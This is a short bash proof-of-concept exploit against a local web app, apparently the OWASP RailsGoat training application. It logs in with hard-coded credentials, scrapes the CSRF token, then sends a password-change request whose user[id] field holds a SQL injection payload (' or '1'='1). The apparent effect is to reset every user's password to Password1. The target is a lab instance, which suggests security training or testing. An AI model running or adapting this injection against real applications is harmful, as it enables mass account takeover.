#!/bin/bash

base=http://localhost:3000/
user=jim@metacorp.com
pass=alohaowasp

newpass=Password1

curlcmd='curl -b cookies.txt --cookie-jar cookies.txt'
token=$($curlcmd "${base}"| grep -i token | sed -e 's/^.*value=//' | cut -d '"' -f 2)

$curlcmd -X POST -d "authenticity_token=${token}" -d email=$user \
 -d password=$pass "${base}/sessions"

# normal password change
# $curlcmd -X POST -d user[id]=5 -d user[password]=testtest1 \
#  -d user[password_confirmation]=testtest1 \
#  -d _method=put "${base}/users/5.json"

$curlcmd -X POST \
  -d "user[id]=5' or '1'='1" \
  -d user[password]=$newpass \
  -d user[password_confirmation]=$newpass \
  -d _method=put "${base}/users/5.json"

